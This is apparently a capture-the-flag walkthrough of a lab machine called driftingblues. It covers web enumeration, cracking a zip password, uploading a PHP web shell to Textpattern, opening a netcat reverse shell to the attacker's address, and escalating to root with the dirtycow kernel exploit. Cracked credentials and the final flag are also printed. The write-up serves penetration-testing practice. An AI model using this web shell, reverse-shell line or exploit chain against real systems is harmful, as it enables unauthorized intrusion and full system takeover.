```
Running all scans on 192.168.236.219

Host is likely running Unknown OS!

---------------------Starting Port Scan-----------------------

PORT   STATE SERVICE
80/tcp open  http
```

Not much on the website
![[Pasted image 20240227185316.png]]

GoBuster
```
gobuster dir -u http://192.168.236.219 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt  -x php,txt,zip -t 50 -b '403,404' -r
```

Hint to add .zip to gobuster search
![[Pasted image 20240227185542.png]]

```gobuster dir -u http://192.168.236.219 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt  -x php,txt,zip -t 50 -b '403,404' -r```
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.236.219
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,zip
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 750]
/db                   (Status: 200) [Size: 53656]
/.                    (Status: 200) [Size: 750]
/robots               (Status: 200) [Size: 110]
/robots.txt           (Status: 200) [Size: 110]
/textpattern          (Status: 200) [Size: 18185]
/spammer              (Status: 200) [Size: 179]
/spammer.zip          (Status: 200) [Size: 179]
Progress: 252356 / 252360 (100.00%)
===============================================================
Finished
===============================================================
```


Download spammer.zip but it wants a password
![[Pasted image 20240227185800.png]]

```zip2john ~/Downloads/spammer.zip > spammer_hash```

Clean this up and run it through hashcat

`type d:\kali_shared\spam_hash.txt`
```$pkzip$1*1*2*0*1b*f*b003611d*0*27*0*1b*b003*2d41804a5ea9a60b1769d045bfb94c71382b2e5febf63bda08a56c*$/pkzip$```


Run this hash through hashcat with -m 17210

```hashcat -m 17210 D:\kali_shared\spam_hash.txt D:\kali_shared\rockyou.txt```

```$pkzip$1*1*2*0*1b*f*b003611d*0*27*0*1b*b003*2d41804a5ea9a60b1769d045bfb94c71382b2e5febf63bda08a56c*$/pkzip$:myspace4```

Creds from spammer.zip
```mayer:lionheart```

Find where to use them
```
feroxbuster --url http://driftingblues.pg/textpattern/ -x php --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -r -o ferox_scan.txt -t 100 
```

![[ferox_scan.txt]]

Going through the ferox scan, we find http://driftingblues.pg/textpattern/textpattern/ with a login and the credentials work

If we go to content -> images
![[Pasted image 20240227190815.png]]

If we go to content -> files, we can upload files. Let's put a basic php webshell up there.
```
<?php echo system($_GET['cmd']); ?>
```

![[Pasted image 20240227190935.png]]

From the ferox scan, it looks like they go to http://driftingblues.pg/textpattern/files/
```
http://driftingblues.pg/textpattern/files/basic_php_webshell.php?cmd=whoami
```

We have RCE
![[Pasted image 20240227191034.png]]

Let's get a reverse shell
![[Pasted image 20240227191114.png]]

```nc -nlvp 4444```
`Ncat: Version 7.94SVN ( https://nmap.org/ncat )`
`Ncat: Listening on [::]:4444`
`Ncat: Listening on 0.0.0.0:4444`


```http://driftingblues.pg/textpattern/files/basic_php_webshell.php?cmd=nc%20192.168.45.222%204444%20-e%20/bin/bash```

`Ncat: Connection from 192.168.236.219:57848.`
```python -c 'import pty; pty.spawn("/bin/bash")'```
`www-data@driftingblues:/var/www/textpattern/files$`

We look for suid permissions files, exim4 is there. There are 2 exploits which fail.

Nothing interesting in crontab. 

Start going through the CVEs suggested by linpeas.
```
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: [ debian=7|8 ],RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: [ debian=7|8 ],RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2013-2094] perf_swevent

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Exposure: highly probable
   Tags: RHEL=6,ubuntu=12.04{kernel:3.2.0-(23|29)-generic},fedora=16{kernel:3.1.0-7.fc16.x86_64},fedora=17{kernel:3.3.4-5.fc17.x86_64},[ debian=7{kernel:3.2.0-4-amd64} ]
   Download URL: https://www.exploit-db.com/download/26131
   Comments: No SMEP/SMAP bypass

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: less probable
   Tags: ubuntu=16.04{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: less probable
   Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-6663,CVE-2016-6664|CVE-2016-6662] mysql-exploit-chain

   Details: https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html
   Exposure: less probable
   Tags: ubuntu=16.04.1
   Download URL: http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c
   Comments: Also MariaDB ver<10.1.18 and ver<10.0.28 affected

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: less probable
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2015-9322] BadIRET

   Details: http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
   Exposure: less probable
   Tags: RHEL<=7,fedora=20
   Download URL: http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Tags: ubuntu=(14.04|15.10){kernel:4.2.0-(18|19|20|21|22)-generic}
   Download URL: https://www.exploit-db.com/download/39166

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/39230

[+] [CVE-2014-5207] fuse_suid

   Details: https://www.exploit-db.com/exploits/34923/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/34923

[+] [CVE-2014-4699] ptrace/sysret

   Details: http://www.openwall.com/lists/oss-security/2014/07/08/16
   Exposure: less probable
   Tags: ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/34134

[+] [CVE-2014-4014] inode_capable

   Details: http://www.openwall.com/lists/oss-security/2014/06/10/4
   Exposure: less probable
   Tags: ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/33824

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2013-2094] semtex

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Exposure: less probable
   Tags: RHEL=6
   Download URL: https://www.exploit-db.com/download/25444

[+] [CVE-2013-2094] perf_swevent 2

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Exposure: less probable
   Tags: ubuntu=12.04{kernel:3.(2|5).0-(23|29)-generic}
   Download URL: https://cyseclabs.com/exploits/vnik_v1.c
   Comments: No SMEP/SMAP bypass

[+] [CVE-2013-1959] userns_root_sploit

   Details: http://www.openwall.com/lists/oss-security/2013/04/29/1
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/25450

[+] [CVE-2013-0268] msr

   Details: https://www.exploit-db.com/exploits/27297/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/27297
```

First one fails and dirtycow2, the first link https://www.exploit-db.com/download/40839 breaks the box, try the second.  https://www.exploit-db.com/download/40847

The first line in the CPP of 40847 tells us how to use it:
`└─$ cat ~/Downloads/40847.cpp` 
`// EDB-Note: Compile:   g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil`

Transfer the cpp over and run the command
```g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil```
`<$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil`      
`www-data@driftingblues:/tmp$ ./dcow`
`./dcow`
`Running ...`
`Received su prompt (Password: )`
`Root password is:   dirtyCowFun`
`Enjoy! :-)`
`www-data@driftingblues:/tmp$ su root`
`su root`
`Password: dirtyCowFun`
`root@driftingblues:/tmp#`

Grab the flag
`cat /root/proof.txt`
`cat /root/proof.txt`
`71bceeab98eda4030ef5562e8abca04b`






